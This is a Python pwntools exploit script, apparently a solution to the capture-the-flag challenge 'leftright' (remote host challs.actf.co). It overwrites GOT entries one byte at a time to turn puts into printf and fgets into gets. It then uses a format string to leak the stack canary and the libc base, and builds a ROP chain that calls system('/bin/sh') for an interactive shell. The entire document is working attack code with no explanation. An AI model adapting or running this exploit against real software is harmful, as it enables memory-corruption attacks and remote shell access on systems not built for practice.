from pwn import *

p = process('./leftright', env={'LD_PRELOAD': './libc.so.6'})
# p = remote('challs.actf.co', 31324)
e = ELF('./leftright')
libc = ELF('./libc.so.6')
context.terminal = 'bash'
context.arch = 'amd64'

ofs_puts = e.symbols['arr'] - e.got['puts']
ofs_stack_chk_fail = e.symbols['arr'] - e.got['__stack_chk_fail']
ofs_fgets = e.symbols['arr'] - e.got['fgets']
ofs_exit = e.symbols['arr'] - e.got['exit']

p.sendlineafter(b': ', b'A')

# puts -> printf
p.sendline(b'1')
for i in range(0x10000-1-ofs_puts):
    p.sendlineafter(b'x', b'1')

p.sendlineafter(b'x', b'2')
p.sendline(b'\x76')

# __stack_chk_fail -> _start
for i in range(ofs_puts-ofs_stack_chk_fail):
    p.sendlineafter(b'x', b'1')

p.sendlineafter(b'x', b'2')
p.sendline(b'\xc0')

# fgets -> gets
for i in range(ofs_stack_chk_fail-ofs_fgets):
    p.sendlineafter(b'x', b'1')

p.sendlineafter(b'x', b'2')
p.sendline(b'\xa0')
p.sendlineafter(b'x', b'1')
p.sendlineafter(b'x', b'2')
p.sendline(b'\x35')

# exit -> _start
for i in range(ofs_fgets-ofs_exit-1):
    p.sendlineafter(b'x', b'1')

p.sendlineafter(b'x', b'2')
p.sendline(b'\xc0')

# Return to main
for i in range(ofs_exit):
    p.sendlineafter(b'x', b'1')
p.sendlineafter(b'x', b'0')

p.sendlineafter(b': ', b'%31$p.%33$p'.ljust(0x20, b'\0'))
p.sendline(b'3')
p.recvuntil(b'bye')

addr = p.recvuntil(b'N')[:-1].split(b'.')
canary = int(addr[0], 16)
libc.address = int(addr[1], 16) - libc.symbols['__libc_start_main'] - 128
log.info(f'canary: {hex(canary)}')
log.info(f'libc: {hex(libc.address)}')

rop_pop_rdi = next(libc.search(asm('pop rdi; ret')))
rop_ret = rop_pop_rdi + 1
payload = flat([
    b'A' * 0x18,
    canary, 0,
    rop_ret, rop_pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.symbols['system']
])
p.sendlineafter(b': ', payload)
p.sendline(b'3')

p.interactive()
